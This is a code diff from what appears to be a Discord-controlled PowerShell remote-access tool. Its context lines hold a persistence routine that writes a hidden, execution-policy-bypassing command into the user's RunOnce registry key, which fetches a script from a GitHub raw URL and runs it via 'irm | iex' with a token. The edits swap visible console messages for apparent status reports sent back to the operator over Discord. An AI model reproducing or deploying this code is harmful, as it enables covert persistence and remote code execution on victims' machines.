@@ -8,7 +8,7 @@ function Mcreate_Ptask{
     $command = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"& {`$token='$token'; irm 'https://raw.githubusercontent.com/JoshuaBrien/Compilation-of-stuff-i-done/refs/heads/main/Coral_network_discordONLY/mainayre.ps1' | iex}`""
     
     Set-ItemProperty -Path $keyPath -Name $valueName -Value $command -Force
-    Write-Host "Registry task created successfully"
+    
 }
 #DISABLEPTASK
 function Mremove_Ptask{
@@ -16,8 +16,8 @@ function Mremove_Ptask{
     $keyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
     if (Get-ItemProperty -Path $keyPath -Name $valueName -ErrorAction SilentlyContinue) {
         Remove-ItemProperty -Path $keyPath -Name $valueName
-        Write-Host "Registry task removed successfully"
+        sendEmbedWithImage -Title "Registry Task Removed" -Description "Registry task removed successfully"
     } else {
-        Write-Host "No registry task found to remove"
+        sendEmbedWithImage -Title "No Registry Task Found" -Description "No registry task found to remove"
     }
 }
